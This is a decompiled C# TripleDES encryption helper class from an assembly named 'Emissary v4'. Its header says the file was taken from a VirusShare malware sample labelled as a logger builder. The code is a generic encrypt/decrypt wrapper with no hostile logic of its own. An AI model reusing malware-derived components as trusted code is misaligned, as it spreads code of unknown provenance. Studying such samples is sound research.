// Decompiled with JetBrains decompiler
// Type: Emissary_v4.cTripleDES
// Assembly: Emissary v4, Version=4.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: CA69DC5A-F895-49A0-AF6E-95A06D6B653E
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00007-msil\Constructor.MSIL.Logger.x-50200bc0f5a9fa00ab96cff3020a84737ca5d907f422f3b834872bb70dcea76f.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace Emissary_v4
{
  internal class cTripleDES
  {
    private TripleDESCryptoServiceProvider m_des;
    private UTF8Encoding m_utf8;
    private byte[] m_key;
    private byte[] m_iv;

    public cTripleDES(byte[] key, byte[] iv)
    {
      this.m_des = new TripleDESCryptoServiceProvider();
      this.m_utf8 = new UTF8Encoding();
      this.m_key = key;
      this.m_iv = iv;
    }

    public byte[] Encrypt(byte[] input) => this.Transform(input, this.m_des.CreateEncryptor(this.m_key, this.m_iv));

    public byte[] Decrypt(byte[] input) => this.Transform(input, this.m_des.CreateDecryptor(this.m_key, this.m_iv));

    public string Encrypt(string text) => Convert.ToBase64String(this.Transform(this.m_utf8.GetBytes(text), this.m_des.CreateEncryptor(this.m_key, this.m_iv)));

    public string Decrypt(string text)
    {
      string str;
      try
      {
        str = this.m_utf8.GetString(this.Transform(Convert.FromBase64String(text), this.m_des.CreateDecryptor(this.m_key, this.m_iv)));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        int num = (int) Interaction.MsgBox((object) "Error, Please check your characters.");
        ProjectData.ClearProjectError();
      }
      return str;
    }

    private byte[] Transform(byte[] input, ICryptoTransform CryptoTransform)
    {
      MemoryStream memoryStream = new MemoryStream();
      CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, CryptoTransform, CryptoStreamMode.Write);
      cryptoStream.Write(input, 0, input.Length);
      cryptoStream.FlushFinalBlock();
      memoryStream.Position = 0L;
      byte[] buffer = new byte[checked ((int) (memoryStream.Length - 1L) + 1)];
      memoryStream.Read(buffer, 0, buffer.Length);
      memoryStream.Close();
      cryptoStream.Close();
      return buffer;
    }
  }
}
